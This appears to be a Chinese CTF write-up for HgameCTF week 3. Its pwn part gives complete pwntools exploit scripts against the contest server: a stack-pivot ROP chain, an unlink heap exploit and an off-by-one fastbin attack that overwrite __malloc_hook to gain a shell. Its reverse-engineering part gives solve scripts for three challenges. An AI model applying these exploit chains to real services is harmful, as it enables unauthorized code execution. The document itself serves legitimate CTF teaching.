@@ -1,0 +1,258 @@
+原创 Nepents 合天智汇
+
+##前言
+
+这个是Hgame_CTF第三周的题目，难度一周比一周大，而且还涉及了多方面的知识，一整期做下来对或许会有一个比较大的提升。其中有一道逆向，是通过监控本地端口来获取输入的，第一次接触这种输入模式，故借此机会记录一下。
+
+上两周的题目回顾：HgameCTF(week1)-RE,PWN题解析
+
+记一次春节CTF实战练习(RE/PWN)
+
+##pwn ###ROP_LEVEL2
+
+程序init禁用了59号中断，所以不能getshell
+
+__int64 init() { __int64 v0; // ST08_8 v0 = seccomp_init(2147418112LL);
+seccomp_rule_add(v0, 0LL, 59LL, 0LL); seccomp_load(v0); return 0LL; }
+
+main函数存在栈溢出，但是最多只能覆盖到EBP和返回地址。前边会读取256个字节进入buf全局变量。可以通过栈迁移把栈区迁移到buf中，然后在buf中构造ROP，调用OPEN函数打开flag然后跳到0x040098F地址读取并输出flag。
+
+#!/usr/bin/python #coding:utf-8 from pwn import * from time import * from
+LibcSearcher import * context.log_level="debug" EXEC_FILE = './ROP' io =
+remote('47.103.214.163',20300) #io = process('./ROP') elf = ELF(EXEC_FILE)
+#padding = 88 read_plt = elf.plt['read'] open_plt = elf.plt['open']
+io.recvuntil('?') #payload = 'flag\x00\x00\x00\x00'# payload = p64(0x060119F)
+payload += p64(0x0400a43)#pop rdi payload += p64(0x6010e0)#flag payload +=
+p64(0x0400a41)#pop rsi payload += p64(0) payload += p64(0)#pading payload +=
+p64(open_plt) payload += p64(0x040098F)# payload += 'flag\x00\x00\x00\x00'#
+io.sendline(payload)#buf 0x006010A0 payload = 'a'*80 payload +=
+p64(0x06010A0)#buf payload += p64(0x4009D5 io.sendline(payload) print
+io.recv() io.interactive()
+
+###Annevi_Note
+
+查看edit函数，每次会固定读入256个字节。而每次只能申请小于143字节的堆块，照成堆溢出。
+
+__int64 edit() { int v1; // [rsp+Ch] [rbp-4h] puts("index?"); v1 = readi(); if
+( list[v1] ) { printf("content:"); read_n((__int64)list[v1], 256);
+puts("done!"); } else { puts("Invalid index!"); } return 0LL; }
+
+check一下文件查看开了哪些保护
+
+![v2-fc8a52a43d5072d97719a016ec1a6555_hd.j](https://pic4.zhimg.com/80/v2-fc8a52a43d5072d97719a016ec1a6555_hd.jpg)
+
+可以先申请usorted bin然后释放再申请回来调用show函数输出unsorted bin
+addr，先减去88再减去main_arena_offset求出libc基地址，不同版本的libc对应着不同版本的main_arena_offset。然后使用unlink使得能改变list中的元素，写入malloc
+hook地址，然后改变malloc hook为one gadget。
+
+exp
+
+#!/usr/bin/python# coding:utf-8 from pwn import * from time import * from
+LibcSearcher import * context.log_level="debug" #EXEC_FILE = "./ROP_LEV"
+REMOTE_LIBC = "./libc-2.23.so" #main_offset = 3951392 io =
+remote('47.103.214.163',20301) #io = process('./Annevi') #elf = ELF(EXEC_FILE)
+libc = ELF(REMOTE_LIBC)
+
+def add(size,content): io.sendlineafter(':','1')
+io.sendlineafter('?',str(size)) io.sendlineafter(':',content) def
+edit(idx,content): io.sendlineafter(':','4') io.sendlineafter('?',str(idx))
+io.sendlineafter(':',content)
+
+def delete(idx): io.sendlineafter(':','2') io.sendlineafter('?',str(idx)) def
+show(idx): io.sendlineafter(':','3') io.sendlineafter('?',str(idx))
+
+add(150,'a') add(150,'b') delete(0) add(150,'a'*7) show(0)#求出libc基地址
+io.recvuntil('a'*7) unsorted_bin = u64(io.recvn(7)[1:].ljust(8,'\x00')) - 88
+print hex(unsorted_bin) libc_addr = unsorted_bin - 3951392 delete(0) delete(1)
+malloc_hook = libc_addr + libc.sym['__malloc_hook'] x = 0x0602040 fd = x-0x18
+bk = x-0x10 payload = p64(0) payload += p64(0x70) payload += p64(fd)+p64(bk)
+payload += 'a'*(0x70-(8*4))+p64(0x70) payload += p64(0)*3+p64(0x90)+p64(0xa0)
+add(0x90,'a')#0 add(0x90,'b')#1 add(0x90,'c') edit(0,payload) delete(1)
+payload = p64(0)*3 payload += p64(malloc_hook) edit(0,payload)
+edit(0,p64(libc_addr+0xf1147)) io.sendlineafter(':','1')
+io.sendlineafter('?',str(150)) io.interactive()
+
+###E99p1ant_Note
+
+查看read_n函数，存在off-by-one。能修溢出修改一个字节。
+
+__int64 __fastcall read_n(__int64 a1, int a2) { int i; // [rsp+1Ch] [rbp-4h]
+for ( i = 0; i <= a2; ++i ) { read(0, (void *)(i + a1), 1uLL); if ( *(_BYTE
+*)(i + a1) == 10 ) break; } return 0LL; }
+
+可以按照上面一道题的方法，先泄露出libc基地址。然后利用off-by-one配合unsorted bin
+attack，使得链表中两个元素指向同一块内存，然后利用fastbin attack修改malloc hook变成one gadget。
+
+#!/usr/bin/python #coding:utf-8 from pwn import * from time import * from
+LibcSearcher import * context.log_level="debug" REMOTE_LIBC = "./libc-2.23.so"
+#main_offset = 3951392 io = remote('47.103.214.163',20302) #io =
+process('./E99') #elf = ELF(EXEC_FILE) libc = ELF(REMOTE_LIBC) def
+add(size,content): io.sendlineafter(':','1') io.sendlineafter('?',str(size))
+io.sendlineafter(':',content) def edit(idx,content): io.sendlineafter(':','4')
+io.sendlineafter('?',str(idx)) io.sendlineafter(':',content) def
+edits(idx,content): io.sendlineafter(':','4') io.sendlineafter('?',str(idx))
+io.recvuntil(':') io.send(content) #io.sendlineafter(':',content) def
+delete(idx): io.sendlineafter(':','2') io.sendlineafter('?',str(idx))def
+show(idx): io.sendlineafter(':','3') io.sendlineafter('?',str(idx))
+add(0x88,'a') add(0x88,'b') delete(0) add(0x88,'a'*7) show(0)#求出libc基地址
+io.recvuntil('a'*7) unsorted_bin = u64(io.recvn(7)[1:].ljust(8,'\x00')) - 88
+print hex(unsorted_bin) libc_addr = unsorted_bin - 3951392 delete(0) delete(1)
+add(0x88,'a')# 0add(0x88,'b')#1 add(0x88,'c')#2 add(0x88,'d')#3
+add(0x88,'e')#4 add(0x88,'f')#5 delete(0)
+edits(3,'a'*0x80+p64(0x240)+p8(0x90)) delete(4) add(0x88,'a')
+#0add(0x68,'a')#4 add(0x10,'a')#6 add(0x68,'a')#7 add(0x10,'a')#8 delete(4)
+delete(7) malloc_hook = libc_addr + libc.sym['__malloc_hook']
+edit(1,p64(malloc_hook-35)*2) add(0x68,'a')#4 add(0x68,'b')#7 print
+hex(libc_addr+0xf24cb) raw_input()
+add(0x68,'a'*(19-8)+p64(libc_addr+0xf1147)+p64(libc_addr+0xf1147))
+io.sendlineafter(':','1') io.sendlineafter('?',str(100)) io.interactive()
+
+##re
+
+###oooollvm
+
+程序加了ollvm混淆，或许可以用deflat.py去除，但是该程序逻辑比较简单，虽然加了混淆，但还是可以看清楚逻辑，所以可以带混淆逆。其实如果实在真的解不了混淆，可以凭经验下断点，或者在全部的真实块下断点动态调试也是可以的，不过比较麻烦。
+
+![v2-cd6924ecf0b08f0e82a8d302ce51a35d_hd.j](https://pic2.zhimg.com/80/v2-cd6924ecf0b08f0e82a8d302ce51a35d_hd.jpg)
+
+v12为计数器，table1和flag经过计算和table2对比。
+
+可以写脚本。
+
+table_2 =
+[0x77,0x25,0x71,0x3F,0xF1,0x46,0xAB,0x4F,0x5F,0x7E,0x87,0x89,0x3E,0x89,0x24,0x17,0x5C,0x19,0xA1,0x36,0xD2,0x3C,0x72,0x51,0x21,0x9C,0xB7,0xA5,0xD0,0x9A,0x1A,0x77,0x06,0x3A]
+table_1 =
+[0x1F,0x41,0x0E,0x4F,0x90,0x38,0x95,0x1C,0x2B,0x1F,0xC0,0xCB,0x03,0xAF,0x6D,0x45,0x5C,0x63,0xBF,0x67,0x83,0x4F,0x16,0x1C,0x3C,0xAF,0xAF,0x75,0x9D,0xBA,0x2C,0x1C,0x43,0x26]
+flag = "" for i in range(34): for q in range(20,127): if (table_2[i] == (~q &
+(table_1[i] + i) | ~(table_1[i] + i) & q)): flag += chr(q) print flag
+
+###Go_master
+
+程序为Go写的linux下的程序。符号表没去，逆起来比较简单。
+
+输入判断是否为9位。
+
+fmt_Fscanln( (__int64)a1, a2, (__int64)&go_itab__os_File_io_Reader,
+(__int64)&v82, v9, v10, (__int64)&go_itab__os_File_io_Reader, os_Stdin); if (
+v81[1] != 9 )// flag长度为9 { *(_QWORD *)&v88 = &unk_517D80; *((_QWORD *)&v88 +
+1) = &off_573EE0; fmt_Fprintln( (__int64)a1, a2,
+(__int64)&go_itab__os_File_io_Writer, (__int64)&v88 , v11, v12,
+(__int64)&go_itab__os_File_io_Writer, os_Stdout);os_Exit((__int64)a1); }
+
+然后进入sha1加密后对比。由于没有的信息，有点难猜测9位是啥。
+
+v80 = v62; *(_QWORD *)v62 = 0xEFCDAB8967452301LL; *(_QWORD *)(v62 + 8) =
+0x1032547698BADCFELL; *(_DWORD *)(v62 + 16) = 0xC3D2E1F0; *(_OWORD *)(v62 +
+88) = 0LL; v13 = *v81; runtime_stringtoslicebyte((__int64)a1, a2, v81[1],
+(__int64)v81, v14, v15); *(_QWORD *)&v16 = v80; *((_QWORD *)&v16 + 1) = 1LL;
+crypto_sha1___digest__Write((__int64)a1, a2, 1LL, 1LL, v17, v16); v64 = 0LL;
+crypto_sha1___digest__Sum((__int64)a1, a2, v18, v19, v20, v21, v80); v76 =
+1LL; runtime_newobject(); v79 = 0LL; unk_0 = 0x532A878B04894333LL; unk_4 =
+xmmword_5514B0; runtime_convTslice((__int64)a1, a2, v22); v78 = 0LL >> 63;
+runtime_convTslice((__int64)a1, a2, v23); *(_QWORD *)&v64 = &unk_515C00;
+reflect_DeepEqual((__int64)a1, a2, v24, v78, v25); v28 = v81; v29 = v81[1];
+v68 = v81[1]; v30 = *v81; v77 = *v81; cout = 0LL;
+
+后来发现这9位和:2333拼接，进入net_Listen函数。
+
+flag___FlagSet__Parse((__int64)a1, a2, qword_647088, os_Args, *(__int128
+*)&v35); runtime_concatstring3( (__int64)a1, a2, v72[1], v74[1], v37, v38, 0,
+*v74, v74[1], (unsigned __int64)":<=?CLMNPSUZ[\n\t" , 1, *v72, v72[1]);
+*(_QWORD *)&v39 = &unk_54E794; *((_QWORD *)&v39 + 1) = 3LL;
+net_Listen((__int64)a1, a2, (__int64)&unk_54E794, v66, v40, v41, v39, v66,
+v67);
+
+这9位可能是个ip地址，2333是端口。猜测127.0.0.1和localhost，发现是localhost。然后运行net_Listen函数监听本地端口2333数据。可以使用telnet往本机端口发送数据。
+
+![v2-a96ecf02e4ae43b3fba6c5221872083e_hd.j](https://pic2.zhimg.com/80/v2-a96ecf02e4ae43b3fba6c5221872083e_hd.jpg)
+
+当接收打数据后，程序会进入main_handleRequest函数，使用des加密监听到的数据对比，密钥为localhost。
+
+![v2-9997c9ddc47469755cd8f9c3a681341e_hd.j](https://pic2.zhimg.com/80/v2-9997c9ddc47469755cd8f9c3a681341e_hd.jpg)
+
+直接解密得到flag
+
+![v2-902737356c05c97e3dbd1efac19168e4_hd.j](https://pic4.zhimg.com/80/v2-902737356c05c97e3dbd1efac19168e4_hd.jpg)
+
+###hidden
+
+先通过ida的交叉调用定位到sub_1400012E0函数。函数先读入flag，判断是不是40字节。
+
+__int64 sub_1400012E0(){ __int64 v0; // rax char v2; // [rsp+28h] [rbp-30h]
+sub_140001C10(&v2); sub_1400015D0(std::cin, &v2); if ( sub_1400024A0() == 40 )
+{v0 = sub_1400023D0((__int64)&v2);sub_140001270(v0); }
+sub_140001E30((__int64)&v2); return 0i64;}
+
+进入到sub_140001270函数
+
+__int64 __fastcall sub_140001270(__int64 a1){ __int64 v1; // rdi int v2; //
+ebx int v3; // eax __int64 result; // rax v1 = a1; v2 = sub_1400010C0(0,
+(unsigned __int8 *)a1, 0x14ui64); v3 = sub_1400010C0(0, (unsigned __int8 *)(v1
++ 20), 0x14ui64); if ( v2 != 0x18257154 || v3 != 2058429201 )result =
+sub_140001030(0); elseresult = sub_140001030(1); return result;}
+
+flag分成两部分进入sub_1400010C0函数。
+
+__int64 __fastcall sub_1400010C0(int a1, unsigned __int8 *a2, unsigned __int64
+a3) { int v3; // ebx unsigned __int64 v4; // rbp unsigned __int8 *v5; // r14
+unsigned int v6; // er12 unsigned int *v7; // r15 signed int v8; // edi
+unsigned int *v9; // rsi unsigned int v10; // edx unsigned int v11; // ecx
+unsigned int v12; // edx unsigned int v13; // ecx unsigned int v14; // edx
+unsigned int v15; // ecx unsigned int v16; // edx unsigned int v17; // ebx
+unsigned __int8 *v18; // rdx __int64 v19; // rax unsigned int v21; //
+[rsp+50h] [rbp+8h] v3 = a1; v4 = a3; v5 = a2; v6 = v21; v7 = (unsigned int
+*)VirtualAlloc(0i64, 0x4000ui64, 0x3000u, 0x40u); v8 = 0; v9 = v7; do { if (
+v8 >= 256 ) { *v9 = v6 ^ *(unsigned int *)((char *)v9 + &unk_140007000 -(_UNKNOWN *)v7 - 1024); if ( v8 == 4095 ) sub_140001010(v5, sub_140001030, v7
++ 256, sub_1400010A0);}else { v10 = ((unsigned int)v8 >> 1) ^ 0xEDB88320; if (
+!(v8 & 1) ) v10 = (unsigned int)v8 >> 1; v11 = (v10 >> 1) ^ 0xEDB88320; if (
+!(v10 & 1) ) v11 = v10 >> 1; v12 = (v11 >> 1) ^ 0xEDB88320; if ( !(v11 & 1) )
+v12 = v11 >> 1; v13 = (v12 >> 1) ^ 0xEDB88320; if ( !(v12 & 1) ) v13 = v12 >>
+1; v14 = (v13 >> 1) ^ 0xEDB88320; if ( !(v13 & 1) ) v14 = v13 >> 1; v15 = (v14
+>> 1) ^ 0xEDB88320; if ( !(v14 & 1) )v15 = v14 >> 1; v16 = (v15 >> 1) ^
+0xEDB88320; if ( !(v15 & 1) )v16 = v15 >> 1; v6 = (v16 >> 1) ^ 0xEDB88320; if
+( !(v16 & 1) )v6 = v16 >> 1; *v9 = v6; } ++v8; ++v9; } while ( v8 < 4096 );
+v17 = ~v3; v18 = v5; if ( v5 > &v5[v4] )v4 = 0i64; if ( v4 ) {do{ v19 =
+*v18++; v17 = (v17 >> 8) ^ v7[v19 ^ (unsigned __int8)v17];}while ( v18 - v5 <
+v4 ); } return ~v17;}
+
+看算法生成了表，很像是CRC32算法。但是会进入sub_140001010函数。
+
+![v2-e2fb70c1b09bfca84998f6f2356e5d97_hd.j](https://pic4.zhimg.com/80/v2-e2fb70c1b09bfca84998f6f2356e5d97_hd.jpg)
+
+里边call
+r8，并且还会调用一个可以输出正确信息的函数。并且这个函数结束之后，会运行int指令。题目名叫hidden，或许真正有用的信息就隐藏在里边。可以动态调试一下到底调用了哪些函数。
+
+__int64 __fastcall sub_283C8F00400(__int64 a1, __int64 (__fastcall
+*a2)(_QWORD)) { signed int j; // [rsp+20h] [rbp-78h] signed int i; //
+[rsp+24h] [rbp-74h] signed int l; // [rsp+28h] [rbp-70h] signed int k; //
+[rsp+2Ch] [rbp-6Ch] unsigned int v7; // [rsp+30h] [rbp-68h] char v8[38]; //
+[rsp+38h] [rbp-60h] char v9; // [rsp+5Eh] [rbp-3Ah] char *v10; // [rsp+60h]
+[rbp-38h] __int64 v11; // [rsp+68h] [rbp-30h] __int64 v12; // [rsp+70h]
+[rbp-28h] __int64 v13; // [rsp+78h] [rbp-20h] __int64 v14; // [rsp+80h]
+[rbp-18h] __int64 v15; // [rsp+88h] [rbp-10h] for ( i = 0; i < 40; ++i ) v8[i]
+= *(_BYTE *)(a1 + i); v10 = &ampv9 for ( j = 0; j < 19; ++j ) { for ( k = 0; k
+< 2; ++k ) { v8[j] ^= v8[j + 19]; v8[j] += v10[k]; v8[j + 19] -= 103; v8[j +
+19] ^= v8[j]; } } v7 = 1; for ( l = 0; l < 40; ++l ) { v11 =
+8896099409227384902i64; v12 = 5221214014029134222i64; v13 =
+5439652918615309179i64; v14 = -9114877380574607267i64 ;v15 =
+9035724225678832282i64; if ( v8[l] != *((char *)&v11 + l) ) { v7 = 0; return
+a2(v7); } } return a2(v7); }
+
+这估计就是真正处理flag的函数了，a2会通过判断传进去的参数输出正确或者失败。可以写脚本。
+
+flag =
+[0x46,0x88,0x8F,0x75,0x47,0x4B,0x75,0x7B,0x8E,0x79,0x7F,0x8A,0x7B,0x7A,0x75,0x48,0x7B,0x7B,0x7B,0x4B,0x82,0x87,0x7D,0x4B,0x5D,0x88,0x9B,0xA7,0x50,0x73,0x81,0x81,0x9A,0x72,0xFA,0x57,0x4F,0x57,0x65,0x7D]
+
+for i in range(18,-1,-1): for q in range(1,-1,-1): flag[i+19] =
+(flag[i+19]^flag[i])&0xff flag[i+19] = (flag[i+19]+103)&0xff flag[i] =
+(flag[i]-flag[(q+38)])&0xff flag[i] = (flag[i]^flag[i+19])&0xffflags = ""for i
+in flag: flags+=chr(i)print flags
+
+如果想更多系统的学习CTF，可点击“[CTF从入门到实践-CTF一站式学习平台-合天网安实验室](http://www.hetianlab.com/pages/CTFLaboratory.jsp)”，进入CTF实验室学习，里面涵盖了6个题目类型系统的学习路径和实操环境。
+
+![v2-f82bb89765c24d5d1676a06697cb56fa_hd.j](https://pic1.zhimg.com/80/v2-f82bb89765c24d5d1676a06697cb56fa_hd.jpg)
+
+声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关!
+
+  
+
